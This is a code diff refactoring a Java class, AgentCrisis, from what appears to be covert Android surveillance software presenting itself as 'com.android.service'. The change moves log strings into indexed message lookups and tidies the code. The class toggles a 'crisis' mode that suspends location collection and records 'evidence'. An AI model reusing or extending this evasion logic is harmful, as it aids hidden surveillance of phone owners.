@@ -11,6 +11,7 @@ package com.android.service.agent;
 
 import java.io.IOException;
 
+import com.android.service.Messages;
 import com.android.service.Status;
 import com.android.service.auto.Cfg;
 import com.android.service.evidence.Evidence;
@@ -18,8 +19,8 @@ import com.android.service.util.Check;
 import com.android.service.util.DataBuffer;
 
 public class AgentCrisis extends AgentBase {
-	private static final String TAG = "AgentCrisis";
-	
+	private static final String TAG = "AgentCrisis"; //$NON-NLS-1$
+ //$NON-NLS-1$
 	public static final int NONE = 0x0; // Per retrocompatibilita'
 	public static final int POSITION = 0x1; // Inibisci il GPS/GSM/WiFi Location
 											// Agent
@@ -36,38 +37,41 @@ public class AgentCrisis extends AgentBase {
 
 	@Override
 	public void begin() {
-        Status.self().startCrisis();
-        Evidence.info("Crisis started");
+		Status.self().startCrisis();
+		Evidence.info(Messages.getString("8.0")); //$NON-NLS-1$
 	}
 
 	@Override
 	public void end() {
-        Status.self().stopCrisis();
-        Evidence.info("Crisis stopped");
+		Status.self().stopCrisis();
+		Evidence.info(Messages.getString("8.2")); //$NON-NLS-1$
 	}
 
 	@Override
 	public boolean parse(AgentConf conf) {
-		byte[] confParameters = conf.getParams();
+		final byte[] confParameters = conf.getParams();
 		if (confParameters.length == 0) {
 			// backward compatibility
 			Status.self().setCrisis(0xffffffff);
 
-			if(Cfg.DEBUG) Check.log( TAG + " Info: " + "old configuration: " + type);
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Info: " + "old configuration: " + type) ;//$NON-NLS-1$ //$NON-NLS-2$
+			}
 
 			return true;
 		}
 
-		final DataBuffer databuffer = new DataBuffer(confParameters, 0,
-				confParameters.length);
+		final DataBuffer databuffer = new DataBuffer(confParameters, 0, confParameters.length);
 
 		try {
 			type = databuffer.readInt();
-		} catch (IOException e) {
+		} catch (final IOException e) {
 			return false;
 		}
 
-		if(Cfg.DEBUG) Check.log( TAG + " Info: " + "type: " + type);
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " Info: " + "type: " + type) ;//$NON-NLS-1$ //$NON-NLS-2$
+		}
 
 		Status.self().setCrisis(type);
 
@@ -76,8 +80,6 @@ public class AgentCrisis extends AgentBase {
 
 	@Override
 	public void go() {
-		// TODO Auto-generated method stub
-
 	}
 
 }
